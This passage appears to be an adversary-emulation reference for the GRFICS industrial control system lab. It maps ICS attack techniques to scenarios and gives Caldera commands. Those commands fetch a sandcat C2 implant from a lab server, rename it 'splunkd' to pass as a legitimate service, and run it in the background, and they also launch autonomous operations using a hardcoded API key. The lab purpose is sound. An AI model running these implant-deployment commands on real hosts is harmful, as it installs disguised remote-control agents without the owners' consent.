| T0832 | Manipulation of View | 7, 10 |
| T0835 | Manipulate I/O Image | 5 |
| T0836 | Modify Parameter | 6 |
| T0837 | Loss of Protection | 9, 10 |
| T0838 | Modify Alarm Settings | 7, 10 |
| T0840 | Network Connection Enumeration | 5, 6 |
| T0842 | Network Sniffing | 1 |
| T0843 | Program Download | 2 |
| T0845 | Program Upload | 9 |
| T0846 | Remote System Discovery | 1, 2, 3, 6 |
| T0848 | Rogue Master | 6 |
| T0849 | Masquerading | 9 |
| T0852 | Screen Capture | 3 |
| T0853 | Scripting | 5 |
| T0856 | Spoof Reporting Message | 3, 10 |
| T0858 | Change Operating Mode | 9, 10 |
| T0861 | Point & Tag Identification | 1, 4 |
| T0866 | Exploitation of Remote Services | 10 |
| T0867 | Lateral Tool Transfer | 5, 10 |
| T0868 | Detect Operating Mode | 6, 9, 10 |
| T0869 | Standard Application Layer Protocol | 5 |
| T0871 | Execution through API | 7, 9 |
| T0872 | Indicator Removal on Host | 8, 10 |
| T0873 | Project File Infection | 5 (variation) |
| T0877 | I/O Image | 5 |
| T0878 | Alarm Suppression | 7 |
| T0879 | Damage to Property | 1 |
| T0880 | Loss of Safety | 4 |
| T0881 | Service Stop | 8, 10 |
| T0882 | Theft of Operational Information | 7 |
| T0883 | Internet Accessible Device | 5, 10 |
| T0885 | Commonly Used Port | 5 |
| T0886 | Remote Services | 5 |
| T0888 | Remote System Information Discovery | 1, 3, 4 |
| T0889 | Modify Program | 2, 9, 10 |
| T0891 | Hardcoded Credentials | 9 |
| T0892 | Change Credential | 7 (escalation) |
| T0893 | Data from Local System | 5 |

**Techniques NOT covered** (infeasible in Docker-based GRFICS): T0817 (Drive-by Compromise), T0830 (Adversary-in-the-Middle), T0834 (Native API), T0847 (Replication via Removable Media), T0851 (Rootkit), T0857 (System Firmware), T0860 (Wireless Compromise), T0862 (Supply Chain Compromise), T0863 (User Execution), T0864 (Transient Cyber Asset), T0865 (Spearphishing Attachment), T0874 (Hooking), T0884 (Connection Proxy), T0887 (Wireless Sniffing), T0890 (Exploitation for PrivEsc), T0894 (System Binary Proxy Execution), T0895 (Autorun Image).

---

## Caldera Deployment Quick Reference

### Agent Deployment Commands

**Kali agent (DMZ):**
```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd; ./splunkd -server $server -group red -v
```

**EWS agent (ICS network):**
```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd; nohup ./splunkd -server $server -group ews -v &
```

### Batch Ability Upload via REST API

For each ability YAML, convert to JSON and POST:

```bash
API="http://localhost:8888/api/v2/abilities"
KEY="VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y"

curl -X POST "$API" -H "KEY: $KEY" -H "Content-Type: application/json" \
  -d '{
    "ability_id": "<UUID>",
    "name": "<name>",
    "description": "<description>",
    "tactic": "<tactic>",
    "technique_id": "<TID>",
    "technique_name": "<technique_name>",
    "executors": [{
      "platform": "linux",
      "name": "sh",
      "command": "<command>",
      "payloads": ["modbus_cli"]
    }]
  }'
```

### Operation Execution Pattern

All operations follow this pattern:

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<Operation-Name>",
    "adversary": {"adversary_id": "<adversary-uuid>"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "<red|ews>",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Verification After Each Operation

```bash
# Check Suricata for Modbus alerts
docker exec router cat /var/log/suricata/eve.json | \
  python3 -c "import sys,json;[print(json.dumps(j,indent=2)) for l in sys.stdin for j in [json.loads(l)] if 'modbus' in str(j).lower() or j.get('event_type')=='alert']" 2>/dev/null | head -50

# Check simulation process alarms
ls -la shared_logs/simulation/process_alarms/

# Check PLC application events
cat shared_logs/plc/plc_app/* 2>/dev/null | tail -20

# Check 3D visualization
echo "Open http://localhost to observe chemical plant state"
```